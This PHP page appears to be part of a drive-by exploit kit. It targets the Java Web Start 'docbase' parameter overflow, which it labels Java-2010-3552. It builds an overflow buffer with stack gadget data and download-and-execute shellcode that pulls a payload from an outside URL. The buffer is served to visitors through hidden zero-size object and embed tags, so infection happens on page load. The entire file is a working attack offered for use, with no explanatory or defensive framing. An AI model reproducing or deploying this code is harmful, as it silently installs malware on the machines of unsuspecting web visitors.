<?php
include_once('config.php');
include("include/util.php");
include("include/shellcode.php");

function make_docbase($url){


	$shellcode = shellcode_dl_exec($url);

	$docbase = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";

	//stack data

	$docbase = $docbase . "\xC1\x4C\x34\x7C\xEC\x26\x11\x79\x38\x76\x71\x63\x38\xF2\xFE\x65";
	$docbase = $docbase . "\x3F\xCF\xAD\x0F\x34\xA0\x37\x7C\x5E\xD0\x34\x7C\xEA\x30\x35\x7C";
	$docbase = $docbase . "\xAC\x13\x34\x7C\xF8\x2E\x37\x7C\x10\x01\x04\x01\x01\x01\x01\x01";
	$docbase = $docbase . "\x01\x01\x01\x01\x37\x59\x34\x7C\x70\xB1\x38\x7C\x4F\x2F\x37\x7C";
	$docbase = $docbase . "\x27\x34\x34\x7C\x90\x51\x5F\xC3\x2B\xE7\x34\x7C\x5C\x3F\x7E\x47";
	$docbase = $docbase . "\x2A\x39\xF5\x35\xEC\x0B\xF5\x5A\x6B\xF4\x36\x1C\xC8\x03\x35\x7C";
	$docbase = $docbase . "\x0E\x6B\x34\x7C\x4F\x2F\x37\x7C\xC1\x4C\x34\x7C\x60\xB1\x38\x7C";
	$docbase = $docbase . "\x5F\xAA\x35\x7C\x0B\x69\x35\x7C\x12\x70\x3F\xD2\x3F\x36\x34\x7C";
	$docbase = $docbase . "\x51\xCE\x74\x1C\x3E\x56\x2C\xAD\xC1\x4C\x34\x7C\x70\xB1\x38\x7C";
	$docbase = $docbase . "\xEA\x30\x35\x7C\x5E\xD0\x34\x7C\xAC\x13\x34\x7C\x3A\x1D\x36\x33";
	$docbase = $docbase . "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
	$docbase = $docbase . "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

	$docbase = $docbase . $shellcode;

	return $docbase;

}

$docbase = make_docbase("http://drztgoddobmyr.com/555/ble/download_file.php?e=Java-2010-3552");
?>
<html>
<body>
<object id="java_obj" classid="clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA" width="0" height="0">
<PARAM name="launchjnlp" value="1">
<PARAM name="docbase" value="<? echo $docbase ?>">
</object>
<embed type="application/x-java-applet" width="0" height="0" launchjnlp="1" docbase="<? echo $docbase ?>" />

</body>
</html>




